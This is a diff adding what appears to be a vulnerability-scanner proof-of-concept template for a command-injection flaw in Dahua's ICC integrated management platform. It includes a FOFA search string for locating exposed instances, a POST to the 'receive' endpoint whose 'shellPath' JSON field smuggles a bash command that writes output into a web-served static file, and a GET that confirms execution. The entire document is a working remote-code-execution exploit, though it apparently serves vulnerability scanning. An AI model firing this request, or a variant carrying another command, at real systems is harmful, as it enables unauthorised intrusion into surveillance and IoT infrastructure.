@@ -1,0 +1,41 @@
+id: poc-yaml-dahua-icc-receive-command-injection
+info:
+  name: 大华ICC智能物联综合管理平台 receive 命令注入漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 大华ICC智能物联综合管理平台
+  fofa: body="*客户端会小于800*"
+variables:
+  filename: random_str(5)
+requests:
+- method: POST
+  path: /evo-runs/v1.0/receive
+  headers:
+    Content-Type: application/json
+    X-Subject-Headerflag: ADAPT
+  data: "{\n  \"method\": \"agent.ossm.mapping.config\",\n  \"info\": {\n    \"configure\"\
+    : \"abcd\",\n    \"filePath\": \"haha\",\n    \"paramMap\": {\n      \"shellPath\"\
+    : \"/bin/bash -c id>/opt/evoWpms/static/{{.filename}}.txt\",\n      \"filePath\"\
+    : \"abc\"\n    },\n    \"requestIp\": \"\"\n  }\n}"
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"success\":true") &&
+
+    contains(headers,"evo-runs") &&
+
+    contains(content_type,"application/json")
+
+    '
+- method: GET
+  path: /static/{{.filename}}.txt
+  expression: 'status_code == 200 &&
+
+    contains(body,"uid=") &&
+
+    contains(body,"gid=") &&
+
+    !contains(body,"<")
+
+    '
+transport: http
